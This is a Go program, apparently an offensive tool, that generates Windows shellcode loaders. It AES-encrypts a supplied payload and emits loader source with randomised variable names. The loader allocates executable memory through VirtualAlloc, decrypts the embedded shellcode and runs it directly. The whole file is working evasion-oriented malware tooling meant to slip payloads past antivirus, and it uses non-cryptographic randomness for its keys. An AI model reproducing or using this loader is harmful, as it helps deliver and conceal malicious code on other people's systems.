package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"flag"
	"io/ioutil"
	"math/rand"
	"os"
	"text/template"
)

type args struct {
	Key        string
	Ciphertext string
}

func checkAndPanic(err error) {
	if err != nil {
		panic(err)
	}
}

func generateRandomBytes(n int) ([]byte, error) {
	b := make([]byte, n)
	_, err := rand.Read(b)
	if err != nil {
		return nil, err
	}

	return b, nil
}

func encrypt(plaintext []byte) (string, string) {
	key, _ := generateRandomBytes(32)
	block, _ := aes.NewCipher(key)
	ciphertext := make([]byte, len(plaintext))
	stream := cipher.NewCTR(block, key[aes.BlockSize:])
	stream.XORKeyStream(ciphertext, plaintext)

	return base64.StdEncoding.EncodeToString(ciphertext), base64.StdEncoding.EncodeToString(key)
}

func main() {
	body := `
package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"fmt"
	"os"
	"syscall"
	"unsafe"
)

const (
	ImLoXsgyZHyI = 0x1000
	egxsUNd      = 0x2000
	wOgdemlqWBGV = 0x40
)

var (
	WWkBCl = syscall.NewLazyDLL("kernel32.dll")
	vnEYvT = WWkBCl.NewProc("VirtualAlloc")
)

func ueKHhjz(riZzjxfWFmxj uintptr) (uintptr, error) {
	kMojJzioOMRujW, _, dNeEZFofBrnbj := vnEYvT.Call(0, riZzjxfWFmxj, egxsUNd|ImLoXsgyZHyI, wOgdemlqWBGV)
	if kMojJzioOMRujW == 0 {
		return 0, dNeEZFofBrnbj
	}
	return kMojJzioOMRujW, nil
}
func main() {

	ciphertext, _ := base64.StdEncoding.DecodeString("{{.Ciphertext}}")
	key, _ := base64.StdEncoding.DecodeString("{{.Key}}")
	block, _ := aes.NewCipher(key)
	plaintext := make([]byte, len(ciphertext))
	stream := cipher.NewCTR(block, key[aes.BlockSize:])
	stream.XORKeyStream(plaintext, ciphertext)
	// shellcode exec
	kMojJzioOMRujW, dNeEZFofBrnbj := ueKHhjz(uintptr(len(plaintext)))
	if dNeEZFofBrnbj != nil {
		fmt.Println(dNeEZFofBrnbj)
		os.Exit(1)
	}
	ufirXzjJzKNkMJW := (*[890000]byte)(unsafe.Pointer(kMojJzioOMRujW))
	for x, ruhMhpnDGaV := range []byte(plaintext) {
		ufirXzjJzKNkMJW[x] = ruhMhpnDGaV
	}
	syscall.Syscall(kMojJzioOMRujW, 0, 0, 0, 0)
}
`

	file := flag.String("file", "", "file containing your payload")
	flag.Parse()

	tmpl, err := template.New("body").Parse(body)
	checkAndPanic(err)

	data, err := ioutil.ReadFile(*file)
	checkAndPanic(err)

	ciphertext, key := encrypt(data)
	tmpl.Execute(os.Stdout, args{
		Ciphertext: ciphertext,
		Key:        key,
	})
}
